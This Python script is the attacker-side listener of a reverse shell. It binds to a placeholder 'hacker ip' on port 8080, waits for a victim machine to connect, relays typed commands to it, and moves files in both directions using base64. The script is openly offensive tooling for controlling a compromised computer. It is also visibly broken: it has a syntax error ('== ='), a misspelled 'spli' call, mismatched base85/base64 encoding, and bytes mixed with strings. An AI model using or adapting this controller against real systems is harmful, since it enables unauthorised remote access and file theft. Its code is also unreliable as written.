#!/usr/bin/env python

import socket
import subprocess
import json
import base64

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("hacker ip", 8080))
listener.listen(0)
print("listening on port 8080...")
connection, address = listener.accept()
print(f"connection has established from {address}")


def send(cmd):
    data = json.dumps(cmd)
    connection.send(data)


def recieve():
    res = ""
    while True:
        try:
            res += connection.recv(1024)
            return json.loads(res)
        except ValueError:
            continue


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b85decode(content))
        return "Downloading the file..."


def read_file(path):
    with open(path, 'rb') as file:
        return base64.b64encode(file.read(path))


while True:
    command = input(">> ")
    command = command.spli(" ")
    try:
        if command[0] == "upload":
            content = read_file(command[1])
            command.append(content)
        send(command)
        if command[0] == "exit":
            connection.close()
            exit()
        res = recieve()
        if command[0] == = "download" and "Error" not in res:
            res = write_file(command[1], res)
    except Exception:
        res = "Error during cmd exec...!"

    print(res)
